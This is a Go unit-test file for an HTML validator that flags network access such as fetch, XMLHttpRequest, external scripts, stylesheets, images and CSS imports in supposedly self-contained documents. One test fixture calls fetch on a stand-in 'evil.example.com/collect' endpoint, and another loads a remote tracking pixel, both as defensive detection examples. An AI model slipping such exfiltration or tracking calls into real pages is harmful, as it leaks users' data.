package api_test

// html_selfcontain_test.go — pure unit tests for ValidateHtmlSelfContained,
// no I/O, no testcontainers. Mirrors the plan's acceptance list: a positive
// self-contained fixture, plus one negative fixture per prohibited pattern.

import (
	"strings"
	"testing"

	. "mindimprint/api/internal/api"
)

func TestValidateHtmlSelfContainedPassesOnInlineOnlyDoc(t *testing.T) {
	doc := []byte(`<!doctype html>
<html>
<head>
<style>body { background: url(data:image/png;base64,iVBORw0KGgo=); }</style>
</head>
<body>
<img src="data:image/png;base64,iVBORw0KGgo=" />
<img src="assets/local.png" />
<script src="./local-lib.js"></script>
<script>
  console.log("no network here");
  const blobUrl = URL.createObjectURL(new Blob(["x"]));
  const audio = new Audio("blob:https://example.com/should-not-match-as-http");
</script>
</body>
</html>`)

	issues := ValidateHtmlSelfContained(doc)
	if len(issues) != 0 {
		t.Fatalf("want 0 issues for a self-contained doc, got %d: %+v", len(issues), issues)
	}
}

func TestValidateHtmlSelfContainedFlagsFetch(t *testing.T) {
	doc := []byte(`<script>fetch("https://evil.example.com/collect").then(()=>{});</script>`)
	issues := ValidateHtmlSelfContained(doc)
	if len(issues) != 1 {
		t.Fatalf("want 1 issue, got %d: %+v", len(issues), issues)
	}
	if !strings.Contains(issues[0].Message, "fetch(") {
		t.Fatalf("issue message = %q, want it to mention fetch(", issues[0].Message)
	}
}

func TestValidateHtmlSelfContainedFlagsXMLHttpRequest(t *testing.T) {
	doc := []byte(`<script>var x = new XMLHttpRequest(); x.open("GET", "/local");</script>`)
	issues := ValidateHtmlSelfContained(doc)
	if len(issues) != 1 {
		t.Fatalf("want 1 issue, got %d: %+v", len(issues), issues)
	}
	if !strings.Contains(issues[0].Message, "XMLHttpRequest") {
		t.Fatalf("issue message = %q, want it to mention XMLHttpRequest", issues[0].Message)
	}
}

func TestValidateHtmlSelfContainedFlagsExternalScriptSrc(t *testing.T) {
	doc := []byte(`<script src="https://cdn.example.com/lib.js"></script>`)
	issues := ValidateHtmlSelfContained(doc)
	if len(issues) != 1 {
		t.Fatalf("want 1 issue, got %d: %+v", len(issues), issues)
	}
	if !strings.Contains(issues[0].Message, "https://cdn.example.com/lib.js") {
		t.Fatalf("issue message = %q, want it to mention the external URL", issues[0].Message)
	}
}

func TestValidateHtmlSelfContainedFlagsExternalStylesheetLink(t *testing.T) {
	doc := []byte(`<link rel="stylesheet" href="https://fonts.example.com/style.css">`)
	issues := ValidateHtmlSelfContained(doc)
	if len(issues) != 1 {
		t.Fatalf("want 1 issue, got %d: %+v", len(issues), issues)
	}
	if !strings.Contains(issues[0].Message, "https://fonts.example.com/style.css") {
		t.Fatalf("issue message = %q, want it to mention the external URL", issues[0].Message)
	}
}

func TestValidateHtmlSelfContainedFlagsRemoteImageSrc(t *testing.T) {
	doc := []byte(`<img src="http://tracker.example.com/pixel.gif" />`)
	issues := ValidateHtmlSelfContained(doc)
	if len(issues) != 1 {
		t.Fatalf("want 1 issue, got %d: %+v", len(issues), issues)
	}
	if !strings.Contains(issues[0].Message, "http://tracker.example.com/pixel.gif") {
		t.Fatalf("issue message = %q, want it to mention the external URL", issues[0].Message)
	}
}

func TestValidateHtmlSelfContainedFlagsESModuleImport(t *testing.T) {
	doc := []byte(`<script type="module">import { thing } from "https://esm.sh/thing";</script>`)
	issues := ValidateHtmlSelfContained(doc)
	if len(issues) != 1 {
		t.Fatalf("want 1 issue, got %d: %+v", len(issues), issues)
	}
	if !strings.Contains(issues[0].Message, "https://esm.sh/thing") {
		t.Fatalf("issue message = %q, want it to mention the external URL", issues[0].Message)
	}
}

func TestValidateHtmlSelfContainedFlagsCSSImportURLForm(t *testing.T) {
	doc := []byte(`<style>@import url(https://fonts.example.com/a.css);</style>`)
	issues := ValidateHtmlSelfContained(doc)
	if len(issues) != 1 {
		t.Fatalf("want 1 issue, got %d: %+v", len(issues), issues)
	}
	if !strings.Contains(issues[0].Message, "https://fonts.example.com/a.css") {
		t.Fatalf("issue message = %q, want it to mention the external URL", issues[0].Message)
	}
}

func TestValidateHtmlSelfContainedFlagsCSSImportStringForm(t *testing.T) {
	doc := []byte(`<style>@import "https://fonts.example.com/b.css";</style>`)
	issues := ValidateHtmlSelfContained(doc)
	if len(issues) != 1 {
		t.Fatalf("want 1 issue, got %d: %+v", len(issues), issues)
	}
	if !strings.Contains(issues[0].Message, "https://fonts.example.com/b.css") {
		t.Fatalf("issue message = %q, want it to mention the external URL", issues[0].Message)
	}
}

func TestValidateHtmlSelfContainedDedupesRepeatedFetch(t *testing.T) {
	doc := []byte(`<script>fetch("https://a.example.com/1"); fetch("https://a.example.com/1");</script>`)
	issues := ValidateHtmlSelfContained(doc)
	if len(issues) != 1 {
		t.Fatalf("want 1 deduped issue for the identical fetch() finding, got %d: %+v", len(issues), issues)
	}
}
